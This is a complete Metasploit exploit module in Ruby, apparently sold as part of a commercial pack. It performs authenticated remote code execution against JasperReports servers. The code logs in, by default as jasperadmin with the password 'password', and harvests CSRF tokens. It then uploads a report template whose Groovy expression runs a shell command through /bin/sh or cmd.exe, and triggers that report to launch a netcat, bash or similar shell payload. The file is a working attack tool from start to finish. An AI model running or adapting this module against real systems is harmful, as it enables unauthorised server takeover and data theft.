##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'JasperReports Groovy Remote Code Execution',
                      'Description' => %q{
    This module exploits an authenticated remote code execution
    vulnerability in JasperReports.

    JasperReports is a popular enterprise solution for creating
    and managing dynamic reports from any kind of dataset. Gaining
    access to a JasperReports instance may yield significant insight
    into a company's data, and even remote access to the server via
    the operating system shell. This module attempts to use valid
    credentials in order to gain a remote shell on the system.

    Categories: Enterprise

    Price: 7

    Video: https://asciinema.org/a/2kmkklaaqml3t41dc8tmc5ynu

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
    },
      'Author' =>
    [
      'bperry', #metasploit module
    ],
    'License' => 'VolatileMinds',
    'References' =>
    [
      ['URL', 'https://foxglovesecurity.com/2016/10/14/hacking-jasperreports-the-hidden-shell-feature/']
    ],
    'Privileged' => false,
    'Platform'   => ['unix', 'linux', 'windows'],
    'Arch'       => ARCH_CMD,
    'Payload'    =>
    {
      'BadChars' => "<>&\\",
      'Compat'     => {
      'PayloadType'  => 'cmd',
      'RequiredCmd'  => 'generic telnet bash netcat python perl',
    }
    },
    'Targets' =>
    [
      [ 'Windows', { } ],
      [ 'Linux', { } ]
    ],
    'DefaultTarget'  => 1,
    'DisclosureDate' => 'Oct 14 2016'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base JasperReports directory path", '/jasperserver/']),
        OptString.new('USERNAME', [true, 'The username to authenticate with', 'jasperadmin']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'password'])
      ], self.class)
  end

  def exploit
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'j_spring_security_check'),
      'method' => 'POST',
      'vars_post' => {
      'j_username' => datastore['USERNAME'],
      'j_password' => datastore['PASSWORD']
    }
    })

    unless res && res.headers['Location'] =~ /loginsuccess/
      fail_with(Failure::Unknown, 'Authentication failed')
    end

    cookie = res.get_cookies

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'JavaScriptServlet'),
      'method' => 'POST',
      'headers' => {
      'FETCH-CSRF-TOKEN' => 1
    },
    'cookie' => cookie
    })

    csrf = $1 if res && res.body =~ /OWASP_CSRFTOKEN:(.*)/

    unless csrf
      fail_with(Failure::Unknown, 'Could not get CSRF token')
    end

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'flow.html'),
      'vars_get' => {
      '_flowId' => 'reportUnitFlow',
      'ParentFolderUri' => '/reports'
    },
    'cookie' => cookie
    })

    execKey = $1 if res && res.body =~ /flowExecutionKey="(.*?)";/

    if target.name == 'Linux'
      xml = %Q{<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="AllAccounts" pageWidth="595" pageHeight="842" whenNoDataType="AllSectionsNoDetail" columnWidth="515" leftMargin="40" rightMargin="40" topMargin="50" bottomMargin="50" isSummaryWithPageHeaderAndFooter="true" uuid="17f4b3c5-e096-4a65-b030-ed3bb58ce311">
<title>
<band height="79" splitType="Stretch">
<textField>
<reportElement x="227" y="20" width="100" height="30" uuid="32a2a8ff-d90a-48d7-b044-5325b5c6264f"/>
<textFieldExpression><![CDATA[Runtime.getRuntime().exec(new String[] \{"/bin/sh", "-c", "#{payload.encoded}"\})]]></textFieldExpression>
</textField>
</band>
</title>
</jasperReport>
}
    else
      xml = %Q{<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="AllAccounts" pageWidth="595" pageHeight="842">
<title>
<band height="79" splitType="Stretch">
<textField>
<reportElement x="227" y="20" width="100" height="30" uuid="32a2a8ff-d90a-48d7-b044-5325b5c6264f"/>
<textFieldExpression><![CDATA[Runtime.getRuntime().exec(new String[] \{"cmd.exe", "/c", "#{payload.encoded}"\})]]></textFieldExpression>
</textField>
</band>
</title>
</jasperReport>
}
    end

    report_name = Rex::Text.rand_text_alpha(8)

    data = Rex::MIME::Message.new
    data.add_part(execKey, nil, nil, 'form-data; name="_flowExecutionKey"')
    data.add_part(report_name, nil, nil, 'form-data; name="reportUnit.label"')
    data.add_part(report_name, nil, nil, 'form-data; name="reportUnit.name"')
    data.add_part('', nil, nil, 'form-data; name="reportUnit.description"')
    data.add_part('FILE_SYSTEM', nil, nil, 'form-data; name="source"')
    data.add_part(report_name+'.jrxml', nil, nil, 'form-data; name="fileName"')
    data.add_part(xml, 'application/octet-stream', nil, 'form-data; name="jrxmlData"; filename="'+report_name+'.jrxml"')
    data.add_part('', nil, nil, 'form-data; name="_eventId_finish"')
    data.add_part(csrf, nil, nil, 'form-data; name="OWASP_CSRFTOKEN"')

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'flow.html'),
      'method' => 'POST',
      'cookie' => cookie,
      'data' => data.to_s,
      'ctype' => "multipart/form-data;charset=UTF-8;boundary=#{data.bound}",
    })

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'flow.html'),
      'vars_get' => {
        '_flowId' => 'searchFlow',
        'lastMode' => true
      },
      'cookie' => cookie
    })

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'JavaScriptServlet'),
      'method' => 'POST',
      'headers' => {
        'FETCH-CSRF-TOKEN' => 1
      },
    'cookie' => cookie
    })

    csrf = $1 if res && res.body =~ /OWASP_CSRFTOKEN:(.*)/

    unless csrf
      fail_with(Failure::Unknown, 'Could not get CSRF token')
    end

    #Go to report list, grab execution key
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'flow.html'),
      'vars_get' => {
      '_flowId' => 'searchFlow',
    },
    'cookie' => cookie
    })

    execKey = $1 if res && res.body =~ /flowExecutionKey="(.*?)";/

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'JavaScriptServlet'),
      'method' => 'POST',
      'headers' => {
        'FETCH-CSRF-TOKEN' => 1
      },
     'cookie' => cookie
   })

   csrf = $1 if res && res.body =~ /OWASP_CSRFTOKEN:(.*)/
   unless csrf
     fail_with(Failure::Unknown, 'Could not get CSRF token')
   end

   res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path,'flow.html'),
      'vars_get' => {
        '_flowId' => 'searchFlow',
        'method' => 'getNode',
        'provider' => 'repositoryExplorerTreeFoldersProvider',
        'uri' => '/',
        'prefetch' => '/reports'
      },
      'headers' => {
        'OWASP_CSRFTOKEN' => csrf
      },
      'cookie' => cookie
    })

    vprint_good("Execute searchFlow")

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'flow.html'),
      'vars_get' => {
        '_flowId' => 'searchFlow',
       },
      'cookie' => cookie
    })

    execKey = $1 if res && res.body =~ /flowExecutionKey="(.*?)";/

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'JavaScriptServlet'),
      'method' => 'POST',
      'headers' => {
        'FETCH-CSRF-TOKEN' => 1
      },
      'cookie' => cookie
    })

    csrf = $1 if res && res.body =~ /OWASP_CSRFTOKEN:(.*)/

    unless csrf
      fail_with(Failure::Unknown, 'Could not get CSRF token')
    end

    #browse event, same execkey
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'flow.html'),
      'vars_get' => {
        '_flowExecutionKey' => execKey,
        '_eventId' => 'browse'
      },
      'vars_post' => {
        'folderUri' => '/reports',
        'mode' => 'browse'
      },
      'headers' => {
        'OWASP_CSRFTOKEN' => csrf,
        'X-Request-With' => 'AJAXRequest, OWASP CSRFGuard Project',
        'User-Agent' => ''
      },
      'cookie' => cookie,
      'method' => 'POST'
    })

    vprint_good("Executing browse mode")

    #isserveravailable, same exec key
    res = send_request_cgi({
     'uri' => normalize_uri(target_uri.path, 'flow.html'),
     'vars_get' => {
        '_flowExecutionKey' => execKey,
        '_eventId' => 'isServerAvailable'
      },
      'cookie' => cookie
    })

    #final use of same exec key, new one needed after this.
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'flow.html'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
        '_flowExecutionKey' => execKey,
        '_eventId' => 'redirect',
        'flowParams' => "viewReportFlow?_flowId=viewReportFlow&reportUnit=/reports/#{report_name}&standAlone=true&ParentFolderUri=/reports",
        'OWASP_CSRFTOKEN' => csrf
      }
    })

    #get new execution key for second flow of executing the report and payload
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'flow.html'),
      'cookie' => cookie,
      'vars_get' => {
        '_flowId' => 'viewReportFlow',
        'ParentFolderUri' => '/reports',
        'reportUnit' => '/reports/' + report_name,
        'standAlone' => true
      }
    })

    execKey = $1 if res && res.body =~ /flowExecutionKey="(.*?)";/

    vprint_good("Getting new csrf token")
    #get new csrf token
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'JavaScriptServlet'),
      'method' => 'POST',
      'headers' => {
         'FETCH-CSRF-TOKEN' => 1
      },
     'cookie' => cookie
    })

    csrf = $1 if res && res.body =~ /OWASP_CSRFTOKEN:(.*)/

    print_good('Executing malicious report')
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'flow.html'),
      'vars_get' => {
        '_flowExecutionKey' => execKey,
        '_flowId' => 'viewReportFlow',
        '_eventId' => 'refreshReport',
        'pageIndex' => 0,
        'decorate' => 'no',
        'confirm' => true,
        'decorator' => 'empty',
        'ajax' => true
      },
      'vars_post' => {
        '_flowId' => 'viewReportFlow',
        'ParentFolderUri' => '/reports',
        'reportUnit' => '/reports/' + report_name,
        'standAlone' => true
      },
      'cookie' => cookie,
      'headers' => {
        'OWASP_CSRFTOKEN' => csrf,
        'User-Agent' => '',
        'X-Request-With' => 'XMLHttpRequest, OWASP CSRFGuard Project',
        'Referer' => "http#{datastore['SSL'] ? 's' : ''}://#{datastore['RHOST']}#{target_uri.path}/flow.html?_flowId=viewReportFlow&_flowId=viewReportFlow&ParentFolderUri=%2Freports&reportUnit=%2Freports%2F#{report_name}&standAlone=true"
      }
    })

  end
end
